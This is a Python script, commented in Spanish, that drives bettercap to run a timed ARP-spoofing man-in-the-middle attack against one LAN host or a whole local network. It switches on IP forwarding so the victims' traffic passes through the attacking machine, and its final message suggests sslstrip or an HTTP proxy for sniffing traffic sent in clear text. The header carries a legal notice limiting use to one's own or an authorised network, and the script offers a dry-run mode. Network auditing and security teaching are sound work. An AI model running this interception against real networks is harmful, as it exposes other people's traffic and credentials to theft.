#!/usr/bin/env python3
"""Auditoría MITM acotada: envenenamiento ARP con bettercap en red propia.

AVISO LEGAL: interceptar tráfico de una red que no es tuya o sin autorización
expresa del titular es ilegal en España (arts. 197 CP y LSSI 34/2002). Este
modo envía ARP replies falsos a la LAN: afecta a los equipos objetivo y es
visible para sus usuarios. Úsalo sólo en red propia o autorizada.
"""

import argparse
import os
import re
import shutil
import subprocess
import sys
import time

IFACE = re.compile(r"[A-Za-z0-9_.-]+\Z")
IP = re.compile(r"(?:\d{1,3}\.){3}\d{1,3}\Z")


def validar_ip(valor, nombre):
    if not IP.fullmatch(valor) or any(int(o) > 255 for o in valor.split(".")):
        raise ValueError(f"{nombre} no es una IPv4 válida: {valor}")
    return valor


def validar_interfaz(valor):
    if not IFACE.fullmatch(valor):
        raise ValueError(f"interfaz inválida: {valor}")
    return valor


def mejor_gateway():
    """Gateway principal según la tabla de enrutado del sistema."""
    salida = subprocess.run(["ip", "-4", "route", "show", "default"],
                            capture_output=True, timeout=10, check=False)
    texto = salida.stdout.decode(errors="replace")
    m = re.search(r"default via (\d+(?:\.\d+){3})", texto)
    return m.group(1) if m else None


def mitm_arp(interfaz, objetivo, gateway, segundos, seco, solo_objetivos=False):
    """Envenenamiento ARP acotado con bettercap (bidireccional o sólo objetivos)."""
    interfaz = validar_interfaz(interfaz)
    if objetivo:
        objetivo = validar_ip(objetivo, "--objetivo")
    if gateway:
        gateway = validar_ip(gateway, "--gateway")
    if gateway is None and not solo_objetivos:
        gateway = mejor_gateway()
    if not gateway and not solo_objetivos:
        raise ValueError("no hay gateway por defecto; indica --gateway o usa --sin-gateway")
    if not 10 <= segundos <= 3600:
        raise ValueError("--segundos debe estar entre 10 y 3600")
    destino = objetivo or "toda la LAN"
    modo = "entre objetivos (sin tocar el gateway)" if solo_objetivos else f"vía gateway {gateway}"
    if seco:
        print(f"Plan: bettercap arp-spoof {interfaz} {modo} hacia {destino} "
              f"durante {segundos}s; el tráfico de {destino} pasa por esta "
              "máquina (MITM)")
        return 0
    if os.geteuid() != 0:
        raise ValueError("requiere sudo (ARP spoofing e ip_forward)")
    bettercap = shutil.which("bettercap")
    if not bettercap:
        raise FileNotFoundError("falta bettercap (apt install bettercap)")

    ruta_fwd = "/proc/sys/net/ipv4/ip_forward"
    with open(ruta_fwd, encoding="ascii") as f:
        fwd_original = f.read().strip()
    caplet = (f"set arp.spoof.fullduplex true; set arp.spoof.only "
              f"{'true' if solo_objetivos else 'false'}; "
              f"set arp.spoof.targets {objetivo or ''}; arp.spoof on; "
              f"sleep {segundos}; quit")
    orden = [bettercap, "-iface", interfaz, "-silent", "-caplet", "/dev/null",
             "-eval", caplet]
    print(f"[i] ip_forward={fwd_original} (se restaura al terminar)")
    with open(ruta_fwd, "w", encoding="ascii") as f:
        f.write("1\n")
    inicio = time.monotonic()
    try:
        proceso = subprocess.run(orden, capture_output=True,
                                 timeout=segundos + 90, check=False)
        codigo = proceso.returncode
    finally:
        with open(ruta_fwd, "w", encoding="ascii") as f:
            f.write(fwd_original + "\n")
    resumen = (proceso.stdout.decode(errors="replace") +
               proceso.stderr.decode(errors="replace"))
    dur = int(time.monotonic() - inicio)
    if codigo != 0:
        print(f"bettercap terminó con código {codigo}; MITM inconcluyente")
        print(resumen[-400:])
        return 3
    print(f"MITM ARP completado sobre {interfaz} ({modo} → {destino}) "
          f"durante {dur}s; ip_forward restaurado a {fwd_original}")
    print("Siguiente paso opcional: sniff de protocolos en claro con "
          "bettercap http.proxy o sslstrip en la misma sesión")
    return 0


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    sub = parser.add_subparsers(dest="accion", required=True)
    p = sub.add_parser("mitm-arp")
    p.add_argument("--interfaz", required=True)
    p.add_argument("--objetivo", help="IPv4 del equipo objetivo (vacío = toda la LAN)")
    p.add_argument("--gateway", help="IPv4 del gateway (por defecto, el por defecto del sistema)")
    p.add_argument("--segundos", type=int, default=60)
    p.add_argument("--sin-gateway", action="store_true",
                   help="no envenenar hacia el gateway (sólo objetivo↔objetivo)")
    p.add_argument("--dry-run", action="store_true")
    args = parser.parse_args()
    try:
        if args.accion == "mitm-arp":
            return mitm_arp(args.interfaz, args.objetivo, args.gateway,
                            args.segundos, args.dry_run, args.sin_gateway)
    except (OSError, ValueError, subprocess.TimeoutExpired) as exc:
        parser.error(str(exc))


if __name__ == "__main__":
    sys.exit(main())
